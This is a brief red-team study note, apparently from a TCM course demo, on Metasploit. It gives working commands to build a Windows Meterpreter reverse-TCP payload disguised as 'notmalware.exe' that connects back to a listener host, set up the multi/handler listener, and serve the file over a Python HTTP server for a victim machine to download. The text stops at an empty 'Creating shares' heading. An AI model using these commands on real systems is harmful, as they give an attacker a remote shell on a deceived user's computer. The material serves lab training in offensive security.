#tool-red/exploitation

https://www.metasploit.com/n

https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/

# Documentation
## TCM Demo

**Create the reverse_tcp malware for the windows machine:**
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=4444 -f exe -o notmalware.exe`

**Then start up metasploit to run the listerner:**

`msfconsole`

within msfconsole

`use exploit/multi/handler`
`set PAYLOAD windows/meterpreter/reverse_tcp`
`set LHOST [net_int]`
`set LPORT 4444`
`exploit`

**Metasploit will now create a listener for the payload**

within `/home/tcp/malware` **create a python3 simple server** to download the malware on the  windows machine
`python3 -m http.server 8000`

On Windows machine enter in the http server:
![[download-exploit-tcm-example.png]]

### Creating shares
